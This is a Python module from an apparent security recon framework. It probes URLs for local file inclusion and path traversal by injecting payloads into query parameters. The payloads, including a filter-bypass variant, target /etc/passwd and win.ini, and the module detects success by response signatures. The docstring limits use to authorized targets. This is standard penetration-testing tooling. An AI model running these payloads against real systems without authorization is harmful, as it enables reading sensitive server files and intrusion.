"""
LFI / Path Traversal Prober - ACTIVE.

Takes the URLs tagged "lfi" by url_pattern_filter.py (url_patterns.txt)
and, for each query parameter, tries a handful of path-traversal
payloads aimed at reading /etc/passwd (Linux) or win.ini (Windows), then
checks the response body for that file's own distinctive content - the
same baseline check tools like LFISuite/dotdotpwn start from.

A matched signature ("root:x:0:0:" or "[fonts]") is a strong signal, but
not automatic proof in every edge case (a custom error page could in
theory echo similar text) - verify manually, within your authorized
scope, before reporting it as a confirmed finding.

This sends real, crafted requests to the target - authorized targets
only. Run "URL Pattern Filter" first.
"""
import os
from urllib.parse import parse_qs, urlencode, urlsplit, urlunsplit

import requests

from modules import auth_ctx

USER_AGENT = "recon-framework/1.0"
MAX_REQUESTS = 150

# (payload, response-body signature that proves the file was read, label)
PAYLOADS = [
    ("../../../../../../../../etc/passwd", "root:x:0:0:", "Linux /etc/passwd"),
    ("....//....//....//....//....//....//etc/passwd", "root:x:0:0:", "Linux /etc/passwd (filter-bypass)"),
    ("/etc/passwd", "root:x:0:0:", "Linux /etc/passwd (absolute)"),
    ("../../../../../../../../windows/win.ini", "[fonts]", "Windows win.ini"),
    ("..\\..\\..\\..\\..\\..\\windows\\win.ini", "[fonts]", "Windows win.ini (backslash)"),
]


def get_cached(target_path: str) -> dict:
    result_path = os.path.join(target_path, "lfi_probe.txt")
    ran = os.path.isfile(result_path)
    lines = []
    if ran:
        with open(result_path, "r", encoding="utf-8") as f:
            lines = [line.strip() for line in f if line.strip()]
    return {"findings": lines, "ran": ran}


def _candidate_urls(target_path: str):
    """Returns None if url_pattern_filter hasn't been run yet, else a list."""
    patterns_path = os.path.join(target_path, "url_patterns.txt")
    if not os.path.isfile(patterns_path):
        return None
    urls = []
    with open(patterns_path, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line or "\t" not in line:
                continue
            url, tags = line.split("\t", 1)
            if "lfi" in tags:
                urls.append(url)
    return urls


def _build_probe_url(url: str, param: str, params: dict, value: str) -> str:
    parts = urlsplit(url)
    new_params = {k: (v[0] if v else "") for k, v in params.items()}
    new_params[param] = value
    new_query = urlencode(new_params)
    return urlunsplit((parts.scheme, parts.netloc, parts.path, new_query, ""))


def run(domain: str, target_path: str) -> dict:
    candidates = _candidate_urls(target_path)
    if candidates is None:
        return {
            "error": "No url_patterns.txt found - run 'URL Pattern Filter' first "
                     "(which itself needs Wayback Machine URLs run before it).",
            "status": 400,
        }
    if not candidates:
        return {"findings": [], "count": 0, "tested": 0}

    # Adds the target's login cookie / Authorization header (if set) - own domain only.
    session = auth_ctx.make_session(domain, target_path, USER_AGENT)

    findings = []
    tested = 0

    for url in candidates:
        if tested >= MAX_REQUESTS:
            break
        parts = urlsplit(url)
        params = parse_qs(parts.query)
        for param in list(params.keys()):
            if tested >= MAX_REQUESTS:
                break

            for payload, signature, label in PAYLOADS:
                if tested >= MAX_REQUESTS:
                    break
                probe_url = _build_probe_url(url, param, params, payload)
                tested += 1
                try:
                    resp = session.get(probe_url, timeout=8, allow_redirects=True)
                except requests.exceptions.RequestException:
                    continue
                if signature in resp.text:
                    findings.append(f"VULNERABLE ({label})\tparam={param}\t{probe_url}")
                    break

    with open(os.path.join(target_path, "lfi_probe.txt"), "w", encoding="utf-8") as f:
        f.write("\n".join(findings))

    return {"findings": findings, "count": len(findings), "tested": tested}
